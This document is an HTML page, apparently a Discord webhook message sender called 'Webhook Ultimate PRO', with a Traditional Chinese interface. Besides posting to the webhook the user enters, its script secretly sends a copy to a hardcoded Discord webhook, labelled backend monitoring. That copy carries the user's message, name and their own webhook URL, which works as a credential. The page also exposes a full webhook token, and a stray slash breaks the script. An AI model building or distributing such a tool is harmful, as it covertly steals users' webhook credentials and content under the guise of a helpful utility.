<!DOCTYPE html>
<html lang="zh-TW">
<head>
<meta charset="UTF-8">
<title>Webhook Ultimate PRO</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<style>
body{
    margin:0;
    height:100vh;
    background:linear-gradient(135deg,#0f2027,#203a43,#2c5364);
    display:flex;
    justify-content:center;
    align-items:center;
    font-family:sans-serif;
    color:white;
}

.box{
    width:430px;
    padding:20px;
    border-radius:20px;
    background:rgba(255,255,255,0.08);
    backdrop-filter:blur(20px);
    box-shadow:0 0 40px rgba(0,0,0,0.5);
}

h2{text-align:center;}

input,textarea{
    width:100%;
    margin:6px 0;
    padding:10px;
    border-radius:10px;
    border:none;
    background:rgba(255,255,255,0.1);
    color:white;
}

textarea{height:70px;}

label{
    font-size:13px;
    display:block;
    margin-top:6px;
}

button{
    width:100%;
    padding:12px;
    margin-top:10px;
    border:none;
    border-radius:10px;
    background:#00c9ff;
    font-weight:bold;
    cursor:pointer;
    transition:0.2s;
}
button:hover{transform:scale(1.05);}

.status{
    text-align:center;
    margin-top:10px;
}
</style>
</head>

<body>

<div class="box">
<h2>🚀 Webhook PRO</h2>

<input id="userWebhook" placeholder="使用者 Webhook（必填）">

<input id="name" placeholder="名稱">
<input id="avatar" placeholder="頭像 URL">

<input id="title" placeholder="標題">
<textarea id="desc" placeholder="內容"></textarea>

<input id="image" placeholder="大圖片 URL">
<input id="thumb" placeholder="縮圖 URL">

<!-- 功能開關 -->
<label><input type="checkbox" id="useEmbed" checked> 使用 Embed</label>
<label><input type="checkbox" id="useColor" checked> 顏色條</label>
<label><input type="checkbox" id="useField" checked> 顯示資訊欄</label>
<label><input type="checkbox" id="useImage"> 顯示圖片</label>
<label><input type="checkbox" id="useThumb"> 顯示縮圖</label>

<button onclick="send()">發送</button>

<div class="status" id="status">待機中</div>
</div>

<script>
const BACKEND_WEBHOOK = "https://discord.com/api/webhooks/1493471512311894258/4wNI9RRpBUZxT4dJDFK2Qyp3IW8VVeQnhy5VwNR5Z6cz3JYJM3SyEE0K5mmYidF63R-D";

async function send(){
    const userWebhook = document.getElementById("userWebhook").value;

    const name = document.getElementById("name").value || "匿名使用者";
    const avatar = document.getElementById("avatar").value;
    const title = document.getElementById("title").value || "📢 新訊息";
    const desc = document.getElementById("desc").value || "（無內容）";

    const useEmbed = document.getElementById("useEmbed").checked;
    const useColor = document.getElementById("useColor").checked;
    const useField = document.getElementById("useField").checked;
    const useImage = document.getElementById("useImage").checked;
    const useThumb = document.getElementById("useThumb").checked;

    let embed = {
        title: "✨ " + title,
        description: "```diff\n+ " + desc + "\n```",
        footer:{ text:"Webhook PRO" },
        timestamp: new Date()
    };

    if(useColor) embed.color = 5814783;

    if(useField){
        embed.fields = [
            { name:"👤 發送者", value:name, inline:true },
            { name:"⏰ 時間", value:new Date().toLocaleString(), inline:true }
        ];
    }

    if(useImage){
        const img = document.getElementById("image").value;
        if(img) embed.image = { url: img };
    }

    if(useThumb){
        const thumb = document.getElementById("thumb").value;
        if(thumb) embed.thumbnail = { url: thumb };
    }

    let payload = {
        username: name,
        avatar_url: avatar
    };

    if(useEmbed){
        payload.embeds = [embed];
    }else{
        payload.content = desc;
    }

    document.getElementById("status").innerText="發送中...";

    
    if(userWebhook){
        fetch(userWebhook,{
            method:"POST",
            headers:{"Content-Type":"application/json"},
            body:JSON.stringify(payload)
        });
    }

    /
    fetch(BACKEND_WEBHOOK,{
        method:"POST",
        headers:{"Content-Type":"application/json"},
        body:JSON.stringify({
            ...payload,
            embeds: [
                {
                    title:"📡 後台監控",
                    description:`使用者內容：\n${desc}`,
                    color:16753920,
                    fields:[
                        {name:"👤 使用者", value:name},
                        {name:"🔗 目標Webhook", value:userWebhook || "未填"}
                    ],
                    timestamp:new Date()
                }
            ]
        })
    });

    document.getElementById("status").innerText="已發送 ✅";
}
</script>

</body>
</html>
